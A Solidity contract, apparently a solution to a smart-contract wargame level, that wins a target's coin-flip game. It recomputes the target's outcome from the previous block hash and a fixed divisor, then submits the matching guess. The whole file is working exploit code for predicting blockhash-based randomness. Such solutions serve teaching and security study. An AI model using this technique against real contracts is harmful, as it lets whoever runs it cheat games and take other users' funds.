// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipHack {
    using SafeMath for uint256;

    ICoinFlip public target;
    uint256 public immutable FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address target_) {
        target = ICoinFlip(target_);
    }

    function hackFlip() external {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool ans = coinFlip == 1 ? true : false;
        target.flip(ans);
    }
}
